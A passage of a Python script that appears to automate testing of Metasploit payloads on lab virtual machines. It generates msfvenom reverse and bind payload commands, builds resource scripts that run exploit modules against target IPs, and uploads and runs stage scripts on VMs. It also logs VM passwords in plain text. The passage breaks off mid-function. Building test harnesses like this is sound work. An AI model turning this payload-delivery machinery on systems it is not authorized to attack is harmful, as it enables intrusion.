from datetime import datetime
import os
import time
import json
import vm_automation
from lib import SystemCatalog

#
# GOT TIRED OF TRACKING THIS DATA IN A LIST
# 
class portValue:
    """
    THE BELOW portValue CLASS IS HOW I DECIDED TO TRACK THE PORT NUMBERS
    I WANTED A SINGLETON, BUT I FOUND NOTHING IN PYTHON THAT DID THAT.
    THIS CLASS LETS ME SIMPLY CALL get.portValue() AND IT RETURNS A 
    UNIQUE PORT VALUE, SO I DO NOT HAVE TO TRACK WHICH VALUES HAVE BEEN USED.
    """
    def __init__(self, initialValue):
        self.portNumber = initialValue
        
    def get(self):
        self.portNumber = self.portNumber + 1
        return self.portNumber


def bailSafely(testConfig):
    if testConfig != None and 'LOG_FILE' in testConfig:
        logFile = testConfig['LOG_FILE']
        logMsg(logFile, "AN ERROR HAPPENED; RETURNING VMS TO THEIR FULL UPRIGHT AND LOCKED POSITIONS")
        timeToWait = 10
        for i in range(timeToWait):
            logMsg(logFile, "SLEEPING FOR " + str(timeToWait-i) + " SECOND(S); EXIT NOW TO PRESERVE VMS!")
            time.sleep(1)
        if resetVms(testConfig):
            logMsg(logFile, "SUCCESSFULLY RESET VMS")
        else:
            logMsg(logFile, "THERE WAS A PROBLEM RESETTING VMS")
    exit(998)


def breakoutClones(hostDicList, logFile):
    """
    TODO: FIX THIS SO ANYTHING NOT LISTED WILL EXPAND RATHER THAN EXPAND ONLY WHAT'S LISTED
    """
    for host in hostDicList:
        if "CLONES" in host:
            numClones = len(host['CLONES']) + 1 #Don't forget the original
            logMsg(logFile, "FOUND " + str(numClones) + " CLONES")
            if 'SESSION_DATASETS' in host:
                numSessions = len(host['SESSION_DATASETS'])
                sessionsPerClone = numSessions/numClones
                logMsg(logFile, "USING " + str(sessionsPerClone) + " PAYLOADS PER CLONE")
            for clone in host['CLONES']:
                cloneDic = {}
                for item in host:
                    if item == 'NAME':
                        cloneDic[item] = clone['NAME']
                        logMsg(logFile, "ADDED CLONE " + clone['NAME'])
                    elif item == 'HYPERVISOR_CONFIG':
                        if 'HYPERVISOR_CONFIG' in clone:
                            cloneDic[item] = clone['HYPERVISOR_CONFIG']
                        else: 
                            cloneDic[item] = host['HYPERVISOR_CONFIG']
                    elif item == 'SESSION_DATASETS':
                        if 'SESSION_DATASETS' not in clone:
                            cloneDic['SESSION_DATASETS'] = []
                        for index in range(sessionsPerClone):
                            cloneDic[item].append(host[item].pop(0))
                    elif item == 'CLONES':
                        continue
                    else:
                        cloneDic[item] = host[item]
                hostDicList.append(cloneDic)


def checkData(testConfig):
    testResult = True
    for target in testConfig['TARGETS']:
        logMsg(testConfig['LOG_FILE'], "CHECKING " + target['NAME'])
        for sessionData in target['SESSION_DATASETS']:
            payloadName = "NONE"
            if 'PAYLOAD' in sessionData:
                payloadName = sessionData['PAYLOAD']['NAME']
            logMsg(testConfig['LOG_FILE'], "CHECKING " + sessionData['MODULE']['NAME'] + ":" + payloadName)
            statusFlag = True
            try:
                fileObj = open(sessionData['LOCAL_SESSION_FILE'], 'r')
                fileContents = fileObj.read()
                fileObj.close()
            except IOError as e:
                logMsg(testConfig['LOG_FILE'], "FAILED TO OPEN LOCAL REPORT FILE: " + sessionData['LOCAL_SESSION_FILE'])
                continue
            for item in target['SUCCESS_LIST']:
                if item not in fileContents:
                    logMsg(testConfig['LOG_FILE'], str(item))
                    statusFlag = False
            sessionData['STATUS'] = statusFlag
            if statusFlag:
                logMsg(testConfig['LOG_FILE'], sessionData['LOCAL_SESSION_FILE'])
                logMsg(testConfig['LOG_FILE'], "TEST PASSED: " +
                       target['NAME'] + ':' +
                       payloadName + ":" +
                       sessionData['MODULE']['NAME'])
            else:
                testResult = False
                logMsg(testConfig['LOG_FILE'], sessionData['LOCAL_SESSION_FILE'])
                logMsg(testConfig['LOG_FILE'], "TEST FAILED: " +
                       target['NAME'] + ':' +
                       payloadName + ":" +
                       sessionData['MODULE']['NAME'])
    return testResult


def convertAbstractTargets(targetList, catalog_file, logFile):
    return __matchListToCatalog(targetList, catalog_file, logFile)


def confirmMsfHosts(hostList, catalog_file, logFile):
    return __matchListToCatalog(hostList, catalog_file, logFile)


def createServer(configFile, logFile = "default.log"):
    try:
        fileObj = open(configFile, 'r')
        configStr = fileObj.read()
        fileObj.close()
    except IOError as e:
        logMsg(logFile, "UNABLE TO OPEN FILE: " + str(configFile) + '\n' + str(e))
        return None
    try:
        hypervisorDic = json.loads(configStr)
    except Exception as e:
        logMsg(logFile, "UNABLE TO PARSE FILE: " + str(configFile) + '\n' + str(e))
        return None
    if "HYPERVISOR_TYPE" not in hypervisorDic:
        print("INVALID CONFIG FILE; NO HYPERVISOR_TYPE FOUND")
        return None
    if hypervisorDic['HYPERVISOR_TYPE'].lower() == "esxi":
        return vm_automation.esxiServer.createFromConfig(hypervisorDic, logFile)
    if hypervisorDic['HYPERVISOR_TYPE'].lower() == "workstation":
        return vm_automation.workstationServer(hypervisorDic, logFile)


def expandGlobalAttributes(configData, logFile = "default.log"):
    if 'LOG_FILE' in configData:
        logFile = configData['LOG_FILE']
    if 'TARGET_GLOBALS' in configData:
        globalKeys = list(configData['TARGET_GLOBALS'])
        for key in globalKeys:
            for target in configData['TARGETS']:
                if key not in target:
                    target[key] = configData['TARGET_GLOBALS'][key]


def expandGlobalList(hostList, globalList, listName):
    for target in hostList:
        if listName not in target:
            target[listName] = []
        for listItem in globalList:
            target[listName].append(listItem)


def expandPayloadsAndModules(testConfig):
    for target in testConfig['TARGETS']:
        if 'PAYLOADS' not in target:
            target['PAYLOADS'] = []
        if 'MODULES' not in target:
            target['MODULES'] = []
        if 'SESSION_DATASETS' not in target:
            target['SESSION_DATASETS'] = []
        if 'PAYLOADS' in testConfig:
            for payload in testConfig['PAYLOADS']:
                if 'x64' not in target['NAME'].lower() and 'x64' in payload['NAME'].lower():
                    # MISMATCHED ARCH; BAIL
                    continue
                if 'win' in target['NAME'].lower() and 'mettle' in payload['NAME'].lower():
                    # DO ONT USE METTLE PAYLOADS ON WINDOWS
                    continue
                if 'win' not in target['NAME'].lower() and 'win' in payload['NAME'].lower():
                    # ONLY USE WIN PAYLOADS ON WIN
                    continue
                else:
                    logMsg(testConfig['LOG_FILE'], "ADDING " + str(payload))
                    tempPayload = {
                        'NAME': payload['NAME'],
                        'SETTINGS': payload['SETTINGS'][:]
                    }
                    target['PAYLOADS'].append(tempPayload)
                # TODO: ADD A CHECK SO WE DO NOT HAVE MULTIPLE SIMILAR MODULES
        if 'MODULES' in testConfig:
            for module in testConfig['MODULES']:
                target['MODULES'].append(module.copy())


def findAndConfigVms(vmList, vmDataList):
    foundVmList = []
    for vmData in vmDataList:
        try:
            vmName =        vmData['VM_NAME']
            vmUsername =    vmData['VM_USERNAME']
            vmPassword =    vmData['VM_PASSWORD']
        except KeyError as e:
            logMsg("[JSON PARSE ERROR]: COULD NOT FIND VALUE " + \
                    str(e))
            continue
        for j in vmList:
            if vmName.lower() in j.vmName.lower():
                foundVmList.append(j)
                logMsg("ADDING USERNAME " + vmUsername + " PASSWORD " + vmPassword + " TO " + vmName + " : " + j.vmName)
                j.setPassword(vmPassword)
                j.setUsername(vmUsername)
    return foundVmList


def finishAndLaunchStageOne(msfHosts, httpPort, logFile):
    # MAKE THE REST OF THE STAGE ONE SCRIPT
    """
    ONCE ALL THE RC AND VENOM STUFF IS IN THE STAGE ONE SCRIPT, ADD THE COMMAND TO 
    START AN HTTP SERVER TO SERVE THE PAYLOADS, THEN WRITE THE SCRIPT TO A LOCAL FILE, 
    UPLOAD IT, AND RUN IT ON THE MSF_HOST
    """
    for msfHost in msfHosts:
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "cd " + msfHost['MSF_PAYLOAD_PATH'] + "/" + "\n"
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "python -m SimpleHTTPServer " + str(httpPort) + " &\n"
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "echo '' > netstat.txt\n"
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "for i in {1..50}; do\n"
        # If you reset the file each time, there's a very god chance of getting empty files dring the write process.
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "  netstat -ant >> netstat.txt\n"
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "  sleep 5\n"
        msfHost['STAGE_ONE_SCRIPT'] = msfHost['STAGE_ONE_SCRIPT'] + "done\n"
        try:
            fileObj = open(msfHost['STAGE_ONE_FILENAME'], 'w')
            fileObj.write(msfHost['STAGE_ONE_SCRIPT'])
            fileObj.close()
        except IOError as e:
            logMsg(logFile, "[ERROR] FAILED TO WRITE TO FILE " + msfHost['STAGE_ONE_FILENAME'] + str(e))
            return False
        remoteStageOneScriptName = msfHost['SCRIPT_PATH'] + '/stageOneScript.sh'
        msfHost['VM_OBJECT'].makeDirOnGuest(msfHost['MSF_ARTIFACT_PATH'])
        msfHost['VM_OBJECT'].makeDirOnGuest(msfHost['SCRIPT_PATH'])
        """
        RUN STAGE ONE SCRIPTS
        """
        msfHost['VM_OBJECT'].uploadAndRun(msfHost['STAGE_ONE_FILENAME'], remoteStageOneScriptName)
    return True


def checkStagesNeeded(targetData):
    stageTwoNeeded = False
    stageThreeNeeded = False
    if 'VM_TOOLS_UPLOAD' == targetData['METHOD'].upper():
        for sessionData in targetData['SESSION_DATASETS']:
            if 'PAYLOAD' in sessionData:
                stageTwoNeeded = True
            if 'bind' in sessionData['PAYLOAD']['NAME']:
                stageThreeNeeded = True
    return (stageTwoNeeded, stageThreeNeeded)


def finishStageTwo(testConfig, terminationToken, timeoutSec = 300):
    for waitCycles in range(timeoutSec/5):
        stageTwoComplete = True
        try:
            for host in testConfig['TARGETS']:
                stageTwoNeeded, stageThreeNeeded = checkStagesNeeded(host)
                if stageTwoNeeded:
                    if 'VM_TOOLS_UPLOAD' in host['METHOD'].upper():
                        if 'TERMINATION_TOKEN' not in host:
                            localFile = testConfig['REPORT_DIR'] + "/" + host['NAME'] + "_stageTwoLog_" + str(waitCycles) + ".txt"
                            if 'REMOTE_LOG' not in host:
                                logMsg(testConfig['LOG_FILE'], "REMOTE_LOG NOT IN: " + str(host['NAME']))
                                
                            host['VM_OBJECT'].getFileFromGuest(host['REMOTE_LOG'], localFile)
                            try:
                                logFileObj = open(localFile, 'r')
                                logData = logFileObj.read()
                                logFileObj.close()
                            except IOError as e:
                                logMsg(testConfig['LOG_FILE'], "FAILED READING REMOTE LOG FILE: " + localFile + "\n" + str(e))
                                logData = ""
                                pass
                            if terminationToken not in logData:
                                logMsg(testConfig['LOG_FILE'], "NO TERMINATION TOKEN IN LOGFILE ON " + host['NAME'] + "\n")
                                stageTwoComplete = False
                            else:
                                logMsg(testConfig['LOG_FILE'], "TERMINATION TOKEN FOUND IN LOGFILE ON " + host['NAME'] + "\n")
                                localFile = testConfig['REPORT_DIR'] + "/" + host['NAME'] + "_netstat_" + str(waitCycles) + ".txt"
                                host['TERMINATION_TOKEN'] = True
                        else:
                            logMsg(testConfig['LOG_FILE'], "ALREADY FOUND TERMINATION TOKEN ON " + host['NAME'] + "\n")
            if stageTwoComplete == True:
                break;    
            time.sleep(5)
        except KeyboardInterrupt:
            print("CAUGHT KEYBOARD INTERRUPT; ABORTING TEST AND RESETTING VMS....")
            return False
    return True


def generateBranchScript(branchString, logFile):
        gitScript = ""
        branchData = branchString.split('/')
        logMsg(logFile, "FRAMEWORK BRANCH LIST: " + str(branchData))
        logMsg(logFile, "FRAMEWORK BRANCH LIST LENGTH: " + str(len((branchData))))
        
        if len(branchData) > 0 and ((branchData[0] == 'upstream' or branchData[0] == 'origin') or (len(branchData) == 1)):
            # EITHER A COMMIT VERSION IN MASTER, PR OR upstream/master...... JUST USE WHAT THEY GAVE
            logMsg(logFile, "FRAMEWORK REPO TO USE: " + branchString)
            gitScript = "git checkout " + branchString + "\n"
        else:
            # NONSTANDARD REPO......
            logMsg(logFile, "NONSTANDARD FRAMEWORK REPO DETECTED: " + branchString)
            userName = branchData[0]
            logMsg(logFile, "NONSTANDARD FRAMEWORK USERNAME: " + userName)
            repoName = branchData[1]
            logMsg(logFile, "NONSTANDARD FRAMEWORK REPO NAME: " + repoName)
            branchName = '/'.join(branchData[2:])
            logMsg(logFile, "NONSTANDARD FRAMEWORK BRANCH NAME: " + branchName)
            gitSyntax = "https://github.com/" + userName + "/" + repoName + ".git"
            gitScript = gitScript + "git remote add " + userName + " " + gitSyntax + "\n"
            gitScript = gitScript + "git fetch  " + userName + "\n"
            gitScript = gitScript + "git checkout -b  " + branchName + ' ' + userName + '/' + branchName + "\n"
        return gitScript


def getElement(element, vmName, credsDic):
    for credVmName in credsDic.keys():
        if vmName.strip() == credVmName:
            if element in credsDic[credVmName]:
                return credsDic[credVmName][element]
    return False


def getListFromFile(fileName):
    retList = []
    logMsg("GETTING COMMANDS FROM " + str(fileName))
    if fileName != None:
        with open(fileName, 'r') as fileObj:
            for i in fileObj.readlines():
                if '#' != i.strip()[0]:
                    retList.append(i.strip())
    logMsg(str(retList))
    return retList


def getSessionCount(testConfig):
    sessionCount = 0
    for host in testConfig['TARGETS']:
        if 'SESSION_DATASETS' in host:
            sessionCount = sessionCount + len(host['SESSION_DATASETS'])
    return sessionCount


def getTimestamp():
    return str(time.time()).split('.')[0]


def instantiateVmsAndServers(testConfig):
    testVms = []
    hypervisorDic = {}
    logFile = testConfig['LOG_FILE']
    for target in testConfig['MSF_HOSTS'] + testConfig['TARGETS']:
        logMsg(logFile, "PROCESSING: " + target['NAME'])
        if target['TYPE'].upper() == 'VIRTUAL':
            if target['HYPERVISOR_CONFIG'] in hypervisorDic:
                target['SERVER_OBJECT'] = hypervisorDic[target['HYPERVISOR_CONFIG']]
            else:
                hypervisorDic[target['HYPERVISOR_CONFIG']] = createServer(target['HYPERVISOR_CONFIG'], logFile)
                target['SERVER_OBJECT'] = hypervisorDic[target['HYPERVISOR_CONFIG']]
                if target['SERVER_OBJECT'] == None:
                    logMsg(logFile, "NO SERVER FOUND FOR: " + target['NAME'])
                    return []
                target['SERVER_OBJECT'].enumerateVms()
            """
            INSTANTIATE VM INSTANCE AND STORE IT IN THE DICTIONARY
            """
            vmFound = False
            for vm in target['SERVER_OBJECT'].vmList:
                if vm.vmName == target['NAME']:
                    vmFound = True
                    logMsg(logFile, "FOUND VM: " + vm.vmName + " ON " + vm.server.hostname)
                    target['VM_OBJECT'] = vm
                    testVms.append(vm)
                    logMsg(logFile, "ASSIGNED VM: " + str(vm))
                    if 'PASSWORD' in target:
                        vm.setPassword(target['PASSWORD'])
                    if 'USERNAME' in target:
                        vm.setUsername(target['USERNAME'])
            if not vmFound:
                logMsg(logFile, "DID NOT FIND VM: " + target['NAME'] + " ON " + vm.server.hostname)
                testVms.append(None)
    return testVms


def launchStageThree(testConfig):
    for msfHost in testConfig['MSF_HOSTS']:
        localScriptName = testConfig['SCRIPT_DIR'] + "/stageThree_" + '-'.join(msfHost['IP_ADDRESS'].split('.')) + ".sh"
        try:
            fileObj = open(localScriptName, 'w')
            fileObj.write(msfHost['STAGE_THREE_SCRIPT'])
            fileObj.close()
        except IOError as e:
            logMsg(testConfig['LOG_FILE'], "[ERROR] FAILED TO OPEN FILE " + localScriptName + '\n' + str(e))
            return False
        remoteScriptName = msfHost['SCRIPT_PATH'] + "/stageThree.sh"
        remoteInterpreter = None
        if not msfHost['VM_OBJECT'].uploadAndRun(localScriptName, remoteScriptName, remoteInterpreter):
            logMsg(testConfig['LOG_FILE'], "[FATAL ERROR]: FAILED TO UPLOAD/EXECUTE " + localScriptName + " ON " + msfHost['VM_OBJECT'].vmName)
            return False
    return True


def launchStageTwo(testConfig, terminationToken, schedDelay = 180):
    addScheduleDelay = False
    for target in testConfig['TARGETS']:
        logMsg(testConfig['LOG_FILE'], "PROCESSING " + target['NAME'])
        stageTwoNeeded, stageThreeNeeded = checkStagesNeeded(target)
        if stageTwoNeeded:
            if 'VM_TOOLS_UPLOAD' in target['METHOD'].upper():
                remoteInterpreter = None
                escapedIp = 'x'.join(target['IP_ADDRESS'].split('.'))
                logMsg(testConfig['LOG_FILE'], "I THINK " + target['NAME'] + " HAS IP ADDRESS " + target['IP_ADDRESS'])
                if 'win' in target['NAME'].lower():
                    target['REMOTE_LOG'] = target['PAYLOAD_DIRECTORY'] + "\\stageTwoLog.txt"
                    target['STAGE_TWO_FILENAME'] = "stageTwoScript_" +  escapedIp + ".py"
                    remoteScriptName =  target['PAYLOAD_DIRECTORY'] + "\\" + target['STAGE_TWO_FILENAME']
                    remoteInterpreter = target['PYTHON']
                    target['STAGE_TWO_SCRIPT'] = target['STAGE_TWO_SCRIPT'] + \
                        makeStageTwoPyScript(target, testConfig['HTTP_PORT'], target['REMOTE_LOG'], terminationToken)
                else:
                    target['REMOTE_LOG'] = target['PAYLOAD_DIRECTORY'] + "/stageTwoLog.txt"
                    target['STAGE_TWO_FILENAME'] = "stageTwoScript_" +  escapedIp + ".sh"
                    remoteScriptName =  target['PAYLOAD_DIRECTORY'] + "/" + target['STAGE_TWO_FILENAME']
                    remoteInterpreter = None
                    target['STAGE_TWO_SCRIPT'] = target['STAGE_TWO_SCRIPT'] + \
                        makeStageTwoShScript(target, testConfig['HTTP_PORT'], target['REMOTE_LOG'], terminationToken)
                localScriptName =   testConfig['SCRIPT_DIR'] + "/" + target['STAGE_TWO_FILENAME']
                try:
                    fileObj = open(localScriptName, 'w')
                    fileObj.write(target['STAGE_TWO_SCRIPT'])
                    fileObj.close()
                except IOError as e:
                    logMsg(testConfig['LOG_FILE'], "[ERROR] FAILED TO WRITE TO FILE " + localScriptName + str(e))
                    return (False)
                logMsg(testConfig['LOG_FILE'], "METHOD= " + target['METHOD'])
                if ('win' in target['NAME'].lower()) and ('schedule' in target['METHOD'].lower()):
                    addScheduleDelay = True
                    launchResult = target['VM_OBJECT'].uploadAndSchedule(localScriptName, remoteScriptName, schedDelay, remoteInterpreter)
                else:
                    launchResult = target['VM_OBJECT'].uploadAndRun(localScriptName, remoteScriptName, remoteInterpreter)
                if launchResult:
                    logMsg(testConfig['LOG_FILE'], "[INFO]: SUCCESSFULLY LAUNCHED " + localScriptName + " ON " + target['VM_OBJECT'].vmName)
                else:
                    logMsg(testConfig['LOG_FILE'], "[FATAL ERROR]: FAILED TO UPLOAD/EXECUTE " + localScriptName + " ON " + target['VM_OBJECT'].vmName)
        else:
            logMsg(testConfig['LOG_FILE'], "NO STAGE TWO REQUIRED FOR " + target['NAME'])
    if addScheduleDelay:
        # IF WE SCHEDULED THE JOBS, ADD THE DELAY IN BEFORE WE BOTHER CHECKING ON THE PROGESS
        realSleepTime = schedDelay + 60
        logMsg(testConfig['LOG_FILE'], "[INFO]: SLEEPING FOR " + str(realSleepTime) + " TO ALLOW SCHEDULED TASKS TO START")
        time.sleep(realSleepTime)
    else:
        logMsg(testConfig['LOG_FILE'], "NO STAGE TWO WAIT REQUIRED")
    return (True, stageTwoNeeded, stageThreeNeeded)


def loadJson(fileName):
    """
    READ IN THE JSON FILES AND RETURN A DICTIONARY
    GOT TIRED OF WRITING THE TRY/CATCH BLOCKS IN A COUPLE PLACES
    """
    retDict = None
    try:
        fileObj = open(fileName, 'r')
        jsonStr = fileObj.read()
        fileObj.close()
    except IOError as e:
        logMsg("FAILED TO FIND JSON FILE " + fileName + "\n" + str(e))
        return retDict
    try:
        retDict = json.loads(jsonStr)
    except ValueError as f:
        logMsg("FAILED TO PARSE JSON FILE " + fileName + "\n" + str(f))
    return retDict

def logMsg(logFile, strMsg):
    if strMsg == None:
        strMsg="[None]"
    dateStamp = 'testlog:[' + str(datetime.now())+ '] '
    if logFile == None:
        return False
    else:
        try:
            logFileObj = open(logFile, 'a')
            logFileObj.write(dateStamp + strMsg +'\n')
            logFileObj.close()
        except IOError:
            return False
    return True


def logTargetData(testConfig):
    """
    DEBUG PRINT
    """
    for target in testConfig['TARGETS']:
        logMsg(testConfig['LOG_FILE'], "================================================================================")
        logMsg(testConfig['LOG_FILE'], "SESSION_DATASETS FOR " + target['NAME'])
        logMsg(testConfig['LOG_FILE'], "================================================================================")
        for sessionData in target['SESSION_DATASETS']:
            if 'PAYLOAD' in sessionData:
                logMsg(testConfig['LOG_FILE'], sessionData['MODULE']['NAME'] + ":" + sessionData['PAYLOAD']['NAME'])
            else:
                logMsg(testConfig['LOG_FILE'], sessionData['MODULE']['NAME'])
    return None


def makeHtmlReport(targetData, msfHosts):
    htmlString = "<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td><td>PCAP</td></tr>\n"
    for msfHost in msfHosts:
        pcapLink = "<a href=" + msfHost['LOCAL_PCAP'] + ">PCAP FILE</a>"
        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td><td>" + pcapLink + "</td></tr>\n"
    htmlString = htmlString + "</table>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>MODULE</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
    passedString = "<td bgcolor = \"#00cc00\">PASSED</td>"
    failedString = "<td bgcolor = \"#cc0000\">FAILED</td>"
    for host in targetData:
        for sessionData in host['SESSION_DATASETS']:
            payloadFileName = "NO PAYLOAD FILE"
            payloadName = "NO PAYLOAD (AUX?)"
            interpreter = ""            
            if 'PAYLOAD' in sessionData:
                payloadName = sessionData['PAYLOAD']['NAME'].lower()
                if 'FILENAME' in sessionData['PAYLOAD']:
                    payloadFileName = sessionData['PAYLOAD']['FILENAME']
                if 'java' in payloadName:
                    interpreter = "<br>" + host['METERPRETER_JAVA']
                if 'python' in payloadName:
                    interpreter = "<br>" + host['METERPRETER_PYTHON']
            htmlString = htmlString + "<tr><td>" + host['NAME'] + "<br>" + host['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + host['TYPE'] + "</td>" + \
                                    "<td>" + sessionData['MSF_HOST']['NAME'] + "<br>" + sessionData['MSF_HOST']['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + sessionData['MODULE']['NAME'] + "</td>" + \
                                    "<td>" + payloadName + "<br>" + payloadFileName + interpreter + "</td>"
            if 'STATUS' in sessionData:
                if sessionData['STATUS']:
                    htmlString = htmlString + passedString + "\n"
                else:
                    htmlString = htmlString + failedString + "\n"
            else:
                htmlString = htmlString + "<td> NO STATUS LISTED?</td>\n"
            htmlString = htmlString + "<td><a href=" + sessionData['LOCAL_SESSION_FILE'] + ">SESSION CONTENT</a></td></tr>\n"

    htmlString = htmlString + "</table>\n</body>\n</html>\n"
    return htmlString


def makeVenomCmd(targetData, sessionData, portNum, logFile):
    payloadData = sessionData['PAYLOAD']
    payloadType = payloadData['NAME']
    payloadFileName = payloadData['FILENAME']
    msfHostData = sessionData['MSF_HOST']
    """
    WHAT FILE EXTENSION SHOULD WE USE?
    """
    execFormat = ''
    if 'windows' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".exe"
        execFormat = ' -f exe '
    elif 'linux' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".elf"
        execFormat = ' -f elf '
    elif 'python' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".py"
    elif 'java' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".jar"
    else:
        logMsg(logFile, "UNKNOWN PAYLOAD TYPE: " + payloadData['NAME'].lower())
    payloadData['FILENAME'] = payloadFileName
    logMsg(logFile, "PAYLOAD FILENAME = " + payloadData['FILENAME'])
    msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
    # ADD HOST DATA
    if 'bind' in payloadType.lower():
        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
    else:
        msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
    for settingEntry in payloadData['SETTINGS']:
        processedString = replaceWildcards(settingEntry, targetData, sessionData, portNum)
        msfVenomCmd = msfVenomCmd + " " + settingEntry
    logMsg(logFile, "msfvenom cmd = " + msfVenomCmd)
    return msfVenomCmd


def makeRcScript(cmdList, targetData, sessionData, logFile, portNum):
    if 'PAYLOAD' in sessionData:
        payloadName = sessionData['PAYLOAD']['NAME']
    else:
        payloadName = "NONE"
    rcScriptContent =   "# HANDLER SCRIPT FOR \n" + \
                    "# MODULE:  " + sessionData['MODULE']['NAME'] + "\n" + \
                    "# PAYLOAD:  " + payloadName + "\n" + \
                    "# TARGET:   " + targetData['NAME'] + ' [' + targetData['IP_ADDRESS'] +"]\n" + \
                    "# MSF HOST: " + sessionData['MSF_HOST']['IP_ADDRESS'] + "\n"
    rcScriptName = sessionData['RC_IN_SCRIPT_NAME']
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['MODULE']['NAME'] + " ' > " + rcScriptName + "\n"
    if sessionData['MODULE']['NAME'] != 'exploit/multi/handler':
        # THIS IS TERRIBLE, AND I WISH WE DID NOT HAVE TO DO THIS MAYBE ONLY FOR AUX LATER?
        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
        rcScriptContent = rcScriptContent + "echo 'set RHOSTS " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
    for settingItem in sessionData['MODULE']['SETTINGS']:
        processedString = replaceWildcards(settingItem, targetData, sessionData, portNum)
        if '=' in processedString:
            rcScriptContent = rcScriptContent + "echo 'set " + processedString.split('=')[0] + ' ' + processedString.split('=')[1] + "' >> " + rcScriptName + '\n'
    if 'PAYLOAD' in sessionData:
        rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
        for settingItem in sessionData['PAYLOAD']['SETTINGS']:
            rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
        if 'bind' in sessionData['PAYLOAD']['NAME']:
            rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
        if 'reverse' in sessionData['PAYLOAD']['NAME']:
            rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo 'show options' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + rubySleep
        if sessionData['MODULE']['NAME'] != 'exploit/multi/handler':
            rcScriptContent = rcScriptContent + "echo 'check' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    sleep(30)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    else:
        rcScriptContent = rcScriptContent + "echo 'show options' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '  sleep(10)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
        
    addSleep = True
    for cmd in cmdList:
        processedCmd = replaceWildcards(cmd, targetData, sessionData, portNum)
        rcScriptContent = rcScriptContent + "echo '" + processedCmd + "' >> " + rcScriptName + '\n'
        if "<ruby>" in processedCmd.lower():
            addSleep = False
        if "</ruby>" in processedCmd.lower():
            addSleep = True
        if addSleep:
            rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return rcScriptContent    


def makeStageTwoPyScript(targetData, httpPort, remoteLogFile, terminationToken):
    stageTwoPyContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoPyContent = stageTwoPyContent + "import subprocess\n"
    stageTwoPyContent = stageTwoPyContent + "import time\n"
    stageTwoPyContent = stageTwoPyContent + "import urllib\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def logError(logFile, logMessage):\n"
    stageTwoPyContent = stageTwoPyContent + "  try:\n"
